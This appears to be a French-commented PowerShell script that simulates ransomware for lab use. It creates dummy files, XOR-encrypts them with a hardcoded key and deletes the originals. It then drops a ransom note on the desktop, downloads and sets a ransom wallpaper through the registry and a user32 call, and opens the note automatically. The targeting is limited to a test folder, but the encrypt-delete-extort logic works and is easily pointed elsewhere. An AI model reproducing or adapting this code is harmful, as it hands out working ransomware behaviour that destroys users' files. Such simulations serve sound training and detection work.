# Dossier cible
$TARGET = "$env:USERPROFILE\Desktop\test_ransomware"
$DESKTOP = "$env:USERPROFILE\Desktop"
$KEY = [System.Text.Encoding]::UTF8.GetBytes("SimulationKey123")

# Créer le dossier et fichiers bidons si inexistant
if (!(Test-Path $TARGET)) {
    New-Item -ItemType Directory -Path $TARGET | Out-Null
    for ($i = 0; $i -lt 5; $i++) {
        Set-Content "$TARGET\file$i.txt" "Fichier important $i - donnees confidentielles"
    }
}

# Fonction XOR
function XOR-Encrypt($data, $key) {
    $result = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $result[$i] = $data[$i] -bxor $key[$i % $key.Length]
    }
    return $result
}

# Chiffrer les fichiers
Get-ChildItem -Path $TARGET -Recurse -File | Where-Object { $_.Extension -ne ".locked" } | ForEach-Object {
    $data = [System.IO.File]::ReadAllBytes($_.FullName)
    $encrypted = XOR-Encrypt $data $KEY
    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $encrypted)
    Remove-Item $_.FullName
}

# Note de rançon
$note = @"
    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
    ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
    ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║

    Vos fichiers ont ete chiffres !

    Pour les recuperer : simulation-lab@test.com
    Cle de dechiffrement : SIMULATION-LAB-2026

    !! CECI EST UNE SIMULATION - LAB ONLY !!
"@

Set-Content "$TARGET\README_DECRYPT.txt" $note
Set-Content "$DESKTOP\README_DECRYPT.txt" $note

# Télécharger et appliquer le wallpaper
$wallpaperPath = "$env:TEMP\ransom_wallpaper.jpg"
Invoke-WebRequest -Uri "http://www.quickmeme.com/img/61/616b011876d9be977c949b9b66d4fc8a1f1f0efb0aeacdc70551605acf4a9490.jpg" -OutFile $wallpaperPath

Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name Wallpaper -Value $wallpaperPath
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value "10"
Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value "0"

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)

# Ouvrir la note automatiquement
Start-Process "notepad.exe" "$DESKTOP\README_DECRYPT.txt"

Write-Host "[+] Chiffrement termine !"
Write-Host "[+] Fichiers chiffres dans : $TARGET"
Write-Host "[+] Note de rancon deposee sur le Desktop"
Write-Host "[+] Wallpaper change !"
Write-Host "[+] Note ouverte !"
